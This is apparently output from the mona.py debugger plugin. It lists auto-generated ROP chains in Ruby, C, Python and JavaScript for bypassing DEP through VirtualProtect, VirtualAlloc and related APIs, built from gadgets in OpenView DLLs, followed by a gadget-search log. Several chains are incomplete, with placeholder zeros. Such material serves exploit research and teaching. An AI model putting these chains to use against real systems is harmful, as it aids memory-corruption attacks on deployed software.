                0x444422e0,  // POP EAX // RETN 0x0C [ovEventNative.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x00000004,  // 0x00000004-> eax
                0x4444226d,  // POP EDI // POP ESI // POP EBX // POP EBP // RETN 0x0C [ovEventNative.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x4444226d,  // skip 4 bytes [ovEventNative.dll]
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x00000000,  // [-] Unable to find pushad gadget
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into ebp
                0x00000000,  # [-] Unable to find ptr to &SetInformationProcess()
                0x00000000,  # [-] Unable to find gadget to put 00000022 into edx
                0x44442293,  # POP ECX # RETN [ovEventNative.dll] 
                0x4444013c,  # &0x00000002 [ovEventNative.dll]
                0x4444226f,  # POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
                0xffffffff,  # 0xffffffff-> ebx
                0x41414141,  # Filler (compensate)
                0x444422e0,  # POP EAX # RETN 0x0C [ovEventNative.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000004,  # 0x00000004-> eax
                0x4444226d,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x4444226d,  # skip 4 bytes [ovEventNative.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadgets to pickup the desired API pointer into ebp
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find ptr to &SetInformationProcess()
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadget to put 00000022 into edx
              "%u2293%u4444" + // 0x44442293 : ,# POP ECX # RETN [ovEventNative.dll] 
              "%u013c%u4444" + // 0x4444013c : ,# &0x00000002 [ovEventNative.dll]
              "%u226f%u4444" + // 0x4444226f : ,# POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
              "%uffff%uffff" + // 0xffffffff : ,# 0xffffffff-> ebx
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u22e0%u4444" + // 0x444422e0 : ,# POP EAX # RETN 0x0C [ovEventNative.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u0004%u0000" + // 0x00000004 : ,# 0x00000004-> eax
              "%u226d%u4444" + // 0x4444226d : ,# POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u226d%u4444" + // 0x4444226d : ,# skip 4 bytes [ovEventNative.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for SetProcessDEPPolicy() :
          --------------------------------------------
           EAX = <not used>
           ECX = <not used>
           EDX = <not used>
           EBX = dwFlags (ptr to 0x00000000)
           ESP = ReturnTo (automatic)
           EBP = ptr to SetProcessDEPPolicy()
           ESI = <not used>
           EDI = ROP NOP (4 byte stackpivot)
          --------------------------------------------
          
          
          ROP Chain for SetProcessDEPPolicy() [(XP SP3/Vista SP1/2008 Server SP1, can be called only once per process)] :
          ---------------------------------------------------------------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x4444226f,  # POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
                0x44444000,  # &0x00000000 [ovEventNative.dll]
                0x41414141,  # Filler (compensate)
                0x4444226d,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x4444226d,  # skip 4 bytes [ovEventNative.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x4444226f,  // POP EBX // POP EBP // RETN 0x0C [ovEventNative.dll] 
                0x44444000,  // &0x00000000 [ovEventNative.dll]
                0x41414141,  // Filler (compensate)
                0x4444226d,  // POP EDI // POP ESI // POP EBX // POP EBP // RETN 0x0C [ovEventNative.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x4444226d,  // skip 4 bytes [ovEventNative.dll]
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x00000000,  // [-] Unable to find pushad gadget
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x4444226f,  # POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
                0x44444000,  # &0x00000000 [ovEventNative.dll]
                0x41414141,  # Filler (compensate)
                0x4444226d,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x4444226d,  # skip 4 bytes [ovEventNative.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
              "%u226f%u4444" + // 0x4444226f : ,# POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
              "%u4000%u4444" + // 0x44444000 : ,# &0x00000000 [ovEventNative.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u226d%u4444" + // 0x4444226d : ,# POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u226d%u4444" + // 0x4444226d : ,# skip 4 bytes [ovEventNative.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for VirtualAlloc() :
          --------------------------------------------
           EAX = NOP (0x90909090)
           ECX = flProtect (0x40)
           EDX = flAllocationType (0x1000)
           EBX = dwSize
           ESP = lpAddress (automatic)
           EBP = ReturnTo (ptr to jmp esp)
           ESI = ptr to VirtualAlloc()
           EDI = ROP NOP (RETN)
           --- alternative chain ---
           EAX = ptr to &VirtualAlloc()
           ECX = flProtect (0x40)
           EDX = flAllocationType (0x1000)
           EBX = dwSize
           ESP = lpAddress (automatic)
           EBP = POP (skip 4 bytes)
           ESI = ptr to JMP [EAX]
           EDI = ROP NOP (RETN)
           + place ptr to "jmp esp" on stack, below PUSHAD
          --------------------------------------------
          
          
          ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
          --------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d1d408c,  # ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x444413b5,  # POP EBP # RETN [ovEventNative.dll] 
                0x00000000,  # &  [Unable to find ptr to 'JMP ESP']
                0x4444226f,  # POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
                0x00000001,  # 0x00000001-> ebx
                0x41414141,  # Filler (compensate)
                0x00000000,  # [-] Unable to find gadget to put 00001000 into edx
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x44442293,  # POP ECX # RETN [ovEventNative.dll] 
                0x00000040,  # 0x00000040-> ecx
                0x4444226d,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
                0x444422bd,  # RETN (ROP NOP) [ovEventNative.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x444421d3,  # POP EAX # RETN 0x0C [ovEventNative.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d1d408c,  // ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x444413b5,  // POP EBP // RETN [ovEventNative.dll] 
                0x00000000,  // &  [Unable to find ptr to 'JMP ESP']
                0x4444226f,  // POP EBX // POP EBP // RETN 0x0C [ovEventNative.dll] 
                0x00000001,  // 0x00000001-> ebx
                0x41414141,  // Filler (compensate)
                0x00000000,  // [-] Unable to find gadget to put 00001000 into edx
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x44442293,  // POP ECX // RETN [ovEventNative.dll] 
                0x00000040,  // 0x00000040-> ecx
                0x4444226d,  // POP EDI // POP ESI // POP EBX // POP EBP // RETN 0x0C [ovEventNative.dll] 
                0x444422bd,  // RETN (ROP NOP) [ovEventNative.dll]
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x444421d3,  // POP EAX // RETN 0x0C [ovEventNative.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x90909090,  // nop
                0x00000000,  // [-] Unable to find pushad gadget
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d1d408c,  # ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x444413b5,  # POP EBP # RETN [ovEventNative.dll] 
                0x00000000,  # &  [Unable to find ptr to 'JMP ESP']
                0x4444226f,  # POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
                0x00000001,  # 0x00000001-> ebx
                0x41414141,  # Filler (compensate)
                0x00000000,  # [-] Unable to find gadget to put 00001000 into edx
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x44442293,  # POP ECX # RETN [ovEventNative.dll] 
                0x00000040,  # 0x00000040-> ecx
                0x4444226d,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
                0x444422bd,  # RETN (ROP NOP) [ovEventNative.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x444421d3,  # POP EAX # RETN 0x0C [ovEventNative.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadgets to pickup the desired API pointer into esi
              "%u408c%u6d1d" + // 0x6d1d408c : ,# ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
              "%u13b5%u4444" + // 0x444413b5 : ,# POP EBP # RETN [ovEventNative.dll] 
              "%u0000%u0000" + // 0x00000000 : ,# &[Unable to find ptr to 'JMP ESP']
              "%u226f%u4444" + // 0x4444226f : ,# POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
              "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadget to put 00001000 into edx
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u2293%u4444" + // 0x44442293 : ,# POP ECX # RETN [ovEventNative.dll] 
              "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
              "%u226d%u4444" + // 0x4444226d : ,# POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovEventNative.dll] 
              "%u22bd%u4444" + // 0x444422bd : ,# RETN (ROP NOP) [ovEventNative.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u21d3%u4444" + // 0x444421d3 : ,# POP EAX # RETN 0x0C [ovEventNative.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u9090%u9090" + // 0x90909090 : ,# nop
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
0BADF00D      ROP generator finished
0BADF00D  
0BADF00D  [+] Writing stackpivots to file stackpivot.txt
0BADF00D      Wrote 7 pivots to file 
0BADF00D  [+] Writing suggestions to file rop_suggestions.txt
0BADF00D      Wrote 29 suggestions to file
0BADF00D  [+] Writing results to file rop.txt (52 interesting gadgets)
0BADF00D      Wrote 52 interesting gadgets to file
0BADF00D  [+] Writing other gadgets to file rop.txt (158 gadgets)
0BADF00D      Wrote 158 other gadgets to file
0BADF00D  Done
0BADF00D  
0BADF00D  [+] This mona.py action took 0:00:09.688000
0BADF00D  [+] Command used:
0BADF00D  !mona rop -m ovsnmp.dll
          
          ---------- Mona command started on 2018-10-30 04:48:11 (v2.0, rev 577) ----------
0BADF00D  [+] Processing arguments and criteria
0BADF00D      - Pointer access level : X
0BADF00D      - Only querying modules ovsnmp.dll
0BADF00D  [+] Generating module info table, hang on...
0BADF00D      - Processing modules
0BADF00D      - Done. Let's rock 'n roll.
0BADF00D  [+] Preparing output file '_rop_progress_ovas.exe_29032.log'
0BADF00D      - (Re)setting logfile _rop_progress_ovas.exe_29032.log
0BADF00D  [+] Progress will be written to _rop_progress_ovas.exe_29032.log
0BADF00D  [+] Maximum offset : 40
0BADF00D  [+] (Minimum/optional maximum) stackpivot distance : 8
0BADF00D  [+] Max nr of instructions : 6
0BADF00D  [+] Split output into module rop files ? False
0BADF00D  [+] Enumerating 22 endings in 1 module(s)...
0BADF00D      - Querying module ovsnmp.dll
0BADF00D      - Search complete :
0BADF00D         Ending : RETN 0x02, Nr found : 1
0BADF00D         Ending : RETN 0x0C, Nr found : 3
0BADF00D         Ending : RETN 0x00, Nr found : 10
0BADF00D         Ending : RETN, Nr found : 752
0BADF00D         Ending : RETN 0x10, Nr found : 1
0BADF00D      - Filtering and mutating 767 gadgets
0BADF00D        - Progress update : 100 / 767 items processed (Tue 2018/10/30 04:48:13 AM) - (13%)
0BADF00D        - Progress update : 200 / 767 items processed (Tue 2018/10/30 04:48:14 AM) - (26%)
0BADF00D        - Progress update : 300 / 767 items processed (Tue 2018/10/30 04:48:14 AM) - (39%)
0BADF00D        - Progress update : 400 / 767 items processed (Tue 2018/10/30 04:48:15 AM) - (52%)
0BADF00D        - Progress update : 500 / 767 items processed (Tue 2018/10/30 04:48:15 AM) - (65%)
0BADF00D        - Progress update : 600 / 767 items processed (Tue 2018/10/30 04:48:16 AM) - (78%)
0BADF00D        - Progress update : 700 / 767 items processed (Tue 2018/10/30 04:48:16 AM) - (91%)
0BADF00D        - Progress update : 767 / 767 items processed (Tue 2018/10/30 04:48:17 AM) - (100%)
0BADF00D  [+] Creating suggestions list
0BADF00D  [+] Processing suggestions
0BADF00D  [+] Launching ROP generator
0BADF00D  [+] Attempting to produce rop chain for VirtualProtect
0BADF00D      Tue 2018/10/30 04:48:19 AM: Step 1/7: esi
0BADF00D  [+] Searching from 0x5a200000 to 0x5a264000
0BADF00D      Tue 2018/10/30 04:48:21 AM: Step 2/7: ebp
0BADF00D      Tue 2018/10/30 04:48:22 AM: Step 3/7: ebx
0BADF00D      Tue 2018/10/30 04:48:22 AM: Step 4/7: edx
0BADF00D      Tue 2018/10/30 04:48:22 AM: Step 5/7: ecx
0BADF00D      Tue 2018/10/30 04:48:22 AM: Step 6/7: edi
0BADF00D      Tue 2018/10/30 04:48:22 AM: Step 7/7: eax
0BADF00D  [+] Attempting to produce rop chain for SetInformationProcess
0BADF00D      Tue 2018/10/30 04:48:22 AM: Step 1/6: ebp
0BADF00D      Tue 2018/10/30 04:48:25 AM: Step 2/6: edx
0BADF00D      Tue 2018/10/30 04:48:25 AM: Step 3/6: ecx
0BADF00D      Tue 2018/10/30 04:48:25 AM: Step 4/6: ebx
0BADF00D      Tue 2018/10/30 04:48:25 AM: Step 5/6: eax
0BADF00D      Tue 2018/10/30 04:48:25 AM: Step 6/6: edi
0BADF00D  [+] Attempting to produce rop chain for SetProcessDEPPolicy
0BADF00D      Tue 2018/10/30 04:48:25 AM: Step 1/3: ebp
0BADF00D      Tue 2018/10/30 04:48:27 AM: Step 2/3: ebx
0BADF00D      Tue 2018/10/30 04:48:27 AM: Step 3/3: edi
0BADF00D  [+] Attempting to produce rop chain for VirtualAlloc
0BADF00D      Tue 2018/10/30 04:48:27 AM: Step 1/7: esi
0BADF00D  [+] Searching from 0x5a200000 to 0x5a264000
0BADF00D      Tue 2018/10/30 04:48:30 AM: Step 2/7: ebp
0BADF00D      Tue 2018/10/30 04:48:30 AM: Step 3/7: ebx
0BADF00D      Tue 2018/10/30 04:48:30 AM: Step 4/7: edx
0BADF00D      Tue 2018/10/30 04:48:30 AM: Step 5/7: ecx
0BADF00D      Tue 2018/10/30 04:48:30 AM: Step 6/7: edi
0BADF00D      Tue 2018/10/30 04:48:30 AM: Step 7/7: eax
0BADF00D  [+] ROP chains written to file rop_chains.txt
          
          ################################################################################
          
          Register setup for VirtualProtect() :
          --------------------------------------------
           EAX = NOP (0x90909090)
           ECX = lpOldProtect (ptr to W address)
           EDX = NewProtect (0x40)
           EBX = dwSize
           ESP = lPAddress (automatic)
           EBP = ReturnTo (ptr to jmp esp)
           ESI = ptr to VirtualProtect()
           EDI = ROP NOP (RETN)
           --- alternative chain ---
           EAX = ptr to &VirtualProtect()
           ECX = lpOldProtect (ptr to W address)
           EDX = NewProtect (0x40)
           EBX = dwSize
           ESP = lPAddress (automatic)
           EBP = POP (skip 4 bytes)
           ESI = ptr to JMP [EAX]
           EDI = ROP NOP (RETN)
           + place ptr to "jmp esp" on stack, below PUSHAD
          --------------------------------------------
          
          
          ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
          ----------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d3f8098,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x5a22a2a0,  # POP EBP # RETN [ovsnmp.dll] 
                0x5a21233d,  # & call esp [ovsnmp.dll]
                0x5a236375,  # POP EBX # POP EBP # RETN 0x0C [ovsnmp.dll] 
                0x00000201,  # 0x00000201-> ebx
                0x41414141,  # Filler (compensate)
                0x5a21d0f5,  # POP EDX # POP EDI # POP ESI # POP EBP # RETN [ovsnmp.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000040,  # 0x00000040-> edx
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a236393,  # POP ECX # RETN [ovsnmp.dll] 
                0x5a2497ec,  # &Writable location [ovsnmp.dll]
                0x5a20c2a8,  # POP EDI # RETN [ovsnmp.dll] 
                0x5a2363bd,  # RETN (ROP NOP) [ovsnmp.dll]
                0x5a2362d9,  # POP EAX # RETN 0x0C [ovsnmp.dll] 
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d3f8098,  // ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x5a22a2a0,  // POP EBP // RETN [ovsnmp.dll] 
                0x5a21233d,  // & call esp [ovsnmp.dll]
                0x5a236375,  // POP EBX // POP EBP // RETN 0x0C [ovsnmp.dll] 
                0x00000201,  // 0x00000201-> ebx
                0x41414141,  // Filler (compensate)
                0x5a21d0f5,  // POP EDX // POP EDI // POP ESI // POP EBP // RETN [ovsnmp.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x00000040,  // 0x00000040-> edx
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x5a236393,  // POP ECX // RETN [ovsnmp.dll] 
                0x5a2497ec,  // &Writable location [ovsnmp.dll]
                0x5a20c2a8,  // POP EDI // RETN [ovsnmp.dll] 
                0x5a2363bd,  // RETN (ROP NOP) [ovsnmp.dll]
                0x5a2362d9,  // POP EAX // RETN 0x0C [ovsnmp.dll] 
                0x90909090,  // nop
                0x00000000,  // [-] Unable to find pushad gadget
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
